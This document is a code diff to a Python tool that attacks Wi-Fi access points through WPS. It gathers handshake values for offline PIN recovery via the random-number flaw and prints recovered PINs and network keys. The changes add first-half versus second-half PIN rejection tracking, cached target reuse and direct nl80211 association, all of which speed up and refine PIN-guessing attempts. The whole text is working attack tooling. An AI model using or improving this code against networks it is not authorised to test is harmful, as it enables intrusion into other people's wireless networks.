@@ -17,10 +17,18 @@ import queue
 import threading
 import signal
 import re
+import errno
+import struct
 from contextlib import closing as close_resource
 
 
 RESTART_AFTER_EXCLUDED_AP = object()
+# 收到 WSC_NACK 后 wpa_supplicant 仍会打印 CONFIG_ERROR 等诊断属性；
+# 在该窗口内继续补读，才能拿到具体的拒绝原因。
+NACK_DIAGNOSTIC_WINDOW = 0.2
+# Selected AP metadata belongs to the script session, as in managed_connect.py.
+# PINs, credentials and WPS handshake state are never cached.
+target_cache = {}
 
 
 def get_hex(line):
@@ -31,6 +39,14 @@ def get_hex(line):
 class ConnectionStatus:
     # WPS 握手关键数据（hex 大写），用于服务端离线计算随机数缺陷漏洞 PIN。
     HANDSHAKE_FIELDS = ('pke', 'pkr', 'e_nonce', 'authkey', 'e_hash1', 'e_hash2')
+
+    CONFIG_ERROR_RE = re.compile(r'CONFIG_ERROR[^0-9A-Fa-fxX]*(0x[0-9A-Fa-f]+|\d+)', re.IGNORECASE)
+    # WSC 规范的 Configuration Error 只登记可直接判定的几项，其余按原始数字回传。
+    CONFIG_ERROR_LABELS = {
+        0: 'no error',
+        1: 'protocol timeout',
+        2: 'device password auth failure',
+    }
 
     def __init__(self):
         self.status = ''
@@ -47,6 +63,12 @@ class ConnectionStatus:
         self.authkey = ''
         self.e_hash1 = ''
         self.e_hash2 = ''
+        self.max_m_message = 0
+        self.failure_code = ''
+        self.failure_detail = ''
+        self.nack_seen = False
+        self.nack_refined = False
+        self.nack_drain_until = 0.0
 
     def isFirstHalfValid(self):
         return self.first_half_valid
@@ -60,6 +82,60 @@ class ConnectionStatus:
         return dict(pke=self.pke, pkr=self.pkr, eNonce=self.e_nonce,
                     authKey=self.authkey, eHash1=self.e_hash1,
                     eHash2=self.e_hash2, essid=self.essid)
+
+    def note_m_message(self, number, sent):
+        try:
+            number = int(number)
+        except (TypeError, ValueError):
+            return
+        if number < 1 or number > 8:
+            return
+        self.max_m_message = max(self.max_m_message, number)
+        # M5 是 AP 对我们 M4（含 PIN 前半段密文）的确认，收到即前半段正确。
+        if number >= 5 and not sent:
+            self.first_half_valid = True
+
+    def mark_nack(self):
+        """记录 WSC_NACK：先按 M 消息位置定性，补读窗口内再用 CONFIG_ERROR 细化。"""
+        self.status = 'WSC_NACK'
+        if self.nack_seen:
+            return
+        self.nack_seen = True
+        self.nack_drain_until = time.monotonic() + NACK_DIAGNOSTIC_WINDOW
+        self.failure_code = 'WSC_NACK_SECOND_HALF' if self.first_half_valid else 'WSC_NACK_FIRST_HALF'
+        self.failure_detail = 'WPS registrar rejected this PIN'
+
+    def fail(self, code, detail=''):
+        """记录本轮终止原因；已收到 NACK 时保留更具体的拒绝结论。"""
+        if self.nack_seen:
+            if detail and not self.failure_detail:
+                self.failure_detail = detail
+            return
+        self.failure_code = code
+        self.failure_detail = detail
+
+    def observe_failure_line(self, line):
+        """补读 NACK 之后的诊断输出，把具体的 CONFIG_ERROR 写进失败原因。"""
+        if not self.nack_seen or self.nack_refined:
+            return
+        match = self.CONFIG_ERROR_RE.search(line)
+        if match is None:
+            return
+        raw = match.group(1)
+        value = int(raw, 16) if raw.lower().startswith('0x') else int(raw, 10)
+        label = self.CONFIG_ERROR_LABELS.get(value, 'config error %d' % value)
+        self.nack_refined = True
+        self.failure_code = 'WSC_NACK_CONFIG_%d' % value
+        self.failure_detail = '%s (%s)' % (label, line.strip())
+
+    def draining_nack_diagnostics(self):
+        return self.nack_seen and time.monotonic() < self.nack_drain_until
+
+    def failure(self):
+        if not self.failure_code:
+            return None
+        return dict(code=self.failure_code, detail=self.failure_detail,
+                    maxMMessage=self.max_m_message)
 
     def clear(self):
         self.__init__()
@@ -76,10 +152,18 @@ class Companion:
         self.complete_protocol = complete_protocol
         self.check_running = check_running or (lambda: None)
         self.cleaned = False
+        self.cached_target = target_cache.get((interface, (bssid or '').lower()))
+        if (bssid or '').upper() in self.exclude_macs:
+            self.cached_target = None
+        self.cached_nl = None
+        self.cached_association_started = False
 
         self.tempdir = tempfile.mkdtemp()
         with tempfile.NamedTemporaryFile(mode='w', suffix='.conf', delete=False) as temp:
             temp.write('ctrl_interface={}\nctrl_interface_group=root\nupdate_config=1\n'.format(self.tempdir))
+            if self.cached_target is not None:
+                # The script owns association; this process only handles EAP/WPS.
+                temp.write('ap_scan=0\n')
             self.tempconf = temp.name
         self.wpas_ctrl_path = f"{self.tempdir}/{interface}"
         self.__init_wpa_supplicant()
@@ -106,6 +190,10 @@ class Companion:
             '-i{}'.format(self.interface),
             '-c{}'.format(self.tempconf),
         ]
+        if self.cached_target is not None:
+            # Receive externally initiated CONNECT events and ordinary EAPOL
+            # packets, matching the Netlink connection/control-port path below.
+            cmd.append('-pforce_connect_cmd=1 control_port=0')
         self.wpas = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                                      stderr=subprocess.STDOUT, encoding='utf-8', errors='replace')
         self.output_lines = queue.Queue()
@@ -175,6 +263,77 @@ class Companion:
                 if time.monotonic() >= deadline:
                     raise TimeoutError('wpa_supplicant control reply timed out: %s' % command)
 
+    def __cache_selected_target(self):
+        bssid = (self.connection_status.bssid or self.bssid).lower()
+        key = (self.interface, bssid)
+        if not bssid or key in target_cache or bssid.upper() in self.exclude_macs:
+            return
+        import managed_connect
+
+        try:
+            ap = bytes.fromhex(bssid.replace(':', ''))
+            # GET_SCAN reads the existing kernel BSS table; it does not scan.
+            with close_resource(managed_connect.Netlink(self.interface)) as nl:
+                for entry in nl.read_results():
+                    bss = managed_connect.scan.parse_attrs(entry)
+                    if managed_connect.scan.first_attr(bss, 1) != ap:
+                        continue
+                    ies = (managed_connect.scan.first_attr(bss, 6) or
+                           managed_connect.scan.first_attr(bss, 11) or b'')
+                    ssid = next((value for eid, value in
+                                 managed_connect.scan.parse_information_elements(ies)
+                                 if eid == 0), b'')
+                    frequency = managed_connect.scan.first_attr(bss, 2)
+                    if not 1 <= len(ssid) <= 32 or not frequency:
+                        continue
+                    frequency = struct.unpack('=I', frequency)[0]
+                    if frequency <= 0:
+                        continue
+                    signal_value = managed_connect.scan.first_attr(bss, 7)
+                    strength = struct.unpack('=i', signal_value)[0] if signal_value else -10000
+                    capability = managed_connect.scan.first_attr(bss, 5)
+                    privacy = bool(struct.unpack('=H', capability)[0] & 0x10) if capability else True
+                    target_cache[key] = dict(ap=ap, ssid=ssid, frequency=frequency,
+                                             strength=strength, privacy=privacy)
+                    print('[*] Cached WPS AP: %s frequency=%s' % (bssid, frequency))
+                    return
+        except (OSError, ValueError, struct.error) as error:
+            print('[!] Could not cache WPS AP: %s' % error)
+
+    def __connect_cached_target(self, pbc_mode):
+        import managed_connect
+
+        target = self.cached_target
+        self.check_running()
+        self.connection_status.bssid = target['ap'].hex(':').upper()
+        self.connection_status.essid = target['ssid'].decode('utf-8', errors='replace')
+        self.lastPwr = target['strength'] / 100
+        print('[*] Reusing cached WPS AP: %s frequency=%s; skipping scan' % (
+            self.connection_status.bssid, target['frequency']))
+        # Match wps_build_assoc_req_ie(): Version, Request Type and WFA Version2.
+        request_type = 1 if pbc_mode else 2
+        wps = (b'\x00\x50\xf2\x04' +
+               struct.pack('!HHB', 0x104a, 1, 0x10) +
+               struct.pack('!HHB', 0x103a, 1, request_type) +
+               struct.pack('!HH', 0x1049, 6) + b'\x00\x37\x2a\x00\x01\x20')
+        assoc_ie = bytes([221, len(wps)]) + wps
+        attrs = managed_connect.scan.pack_attr(6, target['ap'])
+        attrs += managed_connect.scan.pack_u32_attr(38, target['frequency'])
+        attrs += managed_connect.scan.pack_attr(52, target['ssid'])
+        attrs += managed_connect.scan.pack_u32_attr(53, 0)  # Open-system authentication.
+        attrs += managed_connect.scan.pack_attr(42, assoc_ie)
+        attrs += managed_connect.scan.pack_attr(68, b'')  # CONTROL_PORT.
+        attrs += managed_connect.scan.pack_attr(102, struct.pack('=H', 0x888e))
+        attrs += managed_connect.scan.pack_attr(103, b'')  # CONTROL_PORT_NO_ENCRYPT.
+        if target['privacy']:
+            attrs += managed_connect.scan.pack_attr(70, b'')  # PRIVACY.
+        self.cached_nl = managed_connect.Netlink(self.interface)
+        self.check_running()
+        self.connection_status.status = 'associating'
+        self.__print_with_indicators('*', 'Associating with AP…')
+        self.cached_association_started = True
+        self.cached_nl.command(46, attrs, 'CONNECT WPS using cached AP without scanning')
+
     @staticmethod
     def _explain_wpas_not_ok_status(command: str, respond: str):
         if command.startswith(('WPS_REG', 'WPS_PBC')):
@@ -209,19 +368,21 @@ class Companion:
                 self.__print_with_indicators('*', 'Sending WPS Message WSC_Done…')
             elif 'Building Message M' in line:
                 n = int(line.split('Building Message M')[1].replace('D', ''))
+                self.connection_status.note_m_message(n, sent=True)
                 self.__print_with_indicators('*', 'Sending WPS Message M{}…'.format(n))
             elif 'Received M2D' in line:
                 self.__print_with_indicators('*', 'Received WPS Message M2D')
             elif 'Received M' in line:
                 n = int(line.split('Received M')[1])
+                self.connection_status.note_m_message(n, sent=False)
                 self.__print_with_indicators('*', 'Received WPS Message M{}'.format(n))
                 if n == 5:
-                    self.connection_status.first_half_valid = True
                     print('[+] The first half of the PIN is valid')
             elif 'Received WSC_NACK' in line:
-                self.connection_status.status = 'WSC_NACK'
+                # 不再当场判定“wrong PIN”；继续补读一小段输出，拿到具体的拒绝原因。
+                self.connection_status.mark_nack()
                 self.__print_with_indicators('*', 'Received WSC NACK')
-                print('[-] Error: wrong PIN code')
+                self.__drain_nack_diagnostics(verbose)
             elif 'Enrollee Nonce' in line and 'hexdump' in line:
                 self.connection_status.e_nonce = get_hex(line)
                 print('[P] E-Nonce: {}'.format(self.connection_status.e_nonce))
@@ -261,31 +422,38 @@ class Companion:
             print('[+] WPS protocol completed')
         elif 'WPS-TIMEOUT' in line:
             self.connection_status.status = 'WPS_FAIL'
+            self.connection_status.fail('WPS_TIMEOUT', line.strip())
             print('[-] wpa_supplicant returned WPS-TIMEOUT')
         elif 'WPS-OVERLAP-DETECTED' in line:
             self.connection_status.status = 'WPS_FAIL'
+            self.connection_status.fail('WPS_OVERLAP', line.strip())
             print('[-] wpa_supplicant detected WPS PBC overlap')
         elif ('WPS-FAIL' in line) and (self.connection_status.status != ''):
             self.connection_status.status = 'WPS_FAIL'
+            self.connection_status.fail('WPS_FAIL', line.strip())
             print('[-] wpa_supplicant returned WPS-FAIL')
         elif pbc_mode and ('selected BSS ' in line):
             found_bssid = line.split('selected BSS ')[-1].split()[0].upper()
             if found_bssid in self.exclude_macs:
                 print(f'[*] Ignored excluded AP: {found_bssid}. Aborting this WPS session...')
                 self.connection_status.status = 'EXCLUDED_AP'
+                self.connection_status.fail('EXCLUDED_AP', 'selected AP {} is excluded'.format(found_bssid))
                 return True
 
             self.connection_status.bssid = found_bssid
+            self.__cache_selected_target()
             print('[*] Selected AP: {}'.format(found_bssid))
         elif 'Trying to authenticate with' in line:
             target_bssid = line.split('Trying to authenticate with ')[-1].split()[0].upper()
             if target_bssid in self.exclude_macs:
                 print(f'[*] Excluded AP {target_bssid} is authenticating. Aborting this WPS session...')
                 self.connection_status.status = 'EXCLUDED_AP'
+                self.connection_status.fail('EXCLUDED_AP', 'authenticating AP {} is excluded'.format(target_bssid))
                 return True
 
             self.connection_status.status = 'authenticating'
             self.connection_status.bssid = target_bssid
+            self.__cache_selected_target()
             if 'SSID' in line:
                 self.connection_status.essid = codecs.decode("'".join(line.split("'")[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
             self.__print_with_indicators('*', 'Authenticating…')
@@ -323,7 +491,29 @@ class Companion:
             else:
                 print ("[i] Current signal: {}".format(signal))
 
+        # NACK 补读窗口内解析 CONFIG_ERROR，把具体的拒绝原因写进失败原因。
+        self.connection_status.observe_failure_line(line)
+
         return True
+
+    def __drain_nack_diagnostics(self, verbose):
+        """NACK 之后 wpa_supplicant 仍会打印 CONFIG_ERROR；在短窗口内有界地补读这些诊断行。
+
+        窗口超时或读到进程结束就收尾，取消指令照常经 check_running 生效。
+        """
+        deadline = self.connection_status.nack_drain_until
+        while self.connection_status.draining_nack_diagnostics():
+            try:
+                line = self.output_lines.get(timeout=max(.01, min(.1, deadline - time.monotonic())))
+            except queue.Empty:
+                continue
+            self.check_running()
+            if not line:
+                break
+            if verbose:
+                sys.stdout.write(line)
+                sys.stdout.flush()
+            self.connection_status.observe_failure_line(line.rstrip('\n'))
 
     def __credentialPrint(self, wps_pin=None, wpa_psk=None, essid=None):
         print(f"[+] WPS PIN: '{wps_pin}'")
@@ -388,30 +578,43 @@ class Companion:
         r = self.sendAndReceive(cmd)
         if 'OK' not in r:
             self.connection_status.status = 'WPS_FAIL'
+            self.connection_status.fail('SUPPPLICANT_REJECT', r.strip())
             print(self._explain_wpas_not_ok_status(cmd, r))
             return False
+
+        if self.cached_target is not None:
+            # WPS_REG/WPS_PBC first initializes the normal WPS state machine.
+            # ap_scan=0 keeps its scheduled scan from triggering a driver scan.
+            self.__connect_cached_target(pbc_mode)
 
         while True:
             target_bssid = bssid.lower() if bssid else ""
             res = self.__handle_wpas(pbc_mode=pbc_mode, verbose=verbose, bssid=target_bssid)
             if not res:
                 break
-            if self.connection_status.status == 'WSC_NACK':
+            status = self.connection_status.status
+            if status == 'WSC_NACK':
                 break
-            elif self.connection_status.status == 'GOT_PSK' and not self.complete_protocol:
+            elif status == 'GOT_PSK' and not self.complete_protocol:
                 break
-            elif self.connection_status.status == 'WPS_SUCCESS':
+            elif status == 'WPS_SUCCESS':
                 break
-            elif self.connection_status.status == 'WPS_FAIL':
+            elif status == 'WPS_FAIL':
                 break
-            elif self.connection_status.status == 'EXCLUDED_AP':
+            elif status == 'EXCLUDED_AP':
                 break
+
+        if self.connection_status.status == 'WSC_NACK':
+            print('[-] WPS NACK: {} ({})'.format(
+                self.connection_status.failure_code, self.connection_status.failure_detail))
 
         if self.connection_status.status == 'EXCLUDED_AP':
             # Do not let an excluded AP reach WSC_Done. Confirm cancellation,
             # then discard the entire process and its buffered handshake output.
             self.sendAndReceive('WPS_CANCEL')
             return RESTART_AFTER_EXCLUDED_AP
+
+        self.__cache_selected_target()
 
         # In the historical/incomplete mode, stop immediately after M8 exposes
         # the Network Key. In complete mode wpa_supplicant must be allowed to
@@ -444,7 +647,22 @@ class Companion:
         self.cleaned = True
         if hasattr(self, 'retsock'):
             self.retsock.close()
-        self.__stop_wpa_supplicant()
+        try:
+            self.__stop_wpa_supplicant()
+        finally:
+            if self.cached_nl is not None:
+                try:
+                    if self.cached_association_started:
+                        try:
+                            import managed_connect
+                            attrs = managed_connect.scan.pack_attr(54, struct.pack('=H', 3))
+                            self.cached_nl.command(48, attrs, 'disconnect cached WPS connection')
+                        except OSError as error:
+                            if error.errno != errno.ENOTCONN:
+                                raise
+                finally:
+                    self.cached_nl.close()
+                    self.cached_nl = None
         for name in ('res_socket_file', 'tempconf'):
             path = getattr(self, name, None)
             if path and os.path.exists(path):
@@ -719,6 +937,8 @@ def persistent_fifo_main(interface, command_pipe, event_pipe):
                 message = state.status
             except Exception as error:
                 message = str(error)
+                if state is not None:
+                    state.fail('EXCEPTION', message)
                 print('[-] WPS request failed: %s' % message, flush=True)
             finally:
                 cleanup_completed = True
@@ -756,6 +976,8 @@ def persistent_fifo_main(interface, command_pipe, event_pipe):
                  message=message, cleanupCompleted=cleanup_completed,
                  localMac=actual_mac.hex(':') if actual_mac is not None else None,
                  firstHalfValid=bool(state.isFirstHalfValid()) if state is not None else False,
+                 maxMMessage=(state.max_m_message if state is not None else 0),
+                 failure=(state.failure() if state is not None else None),
                  handshake=(state.handshake() if state is not None else None))
             if not cleanup_completed:
                 break
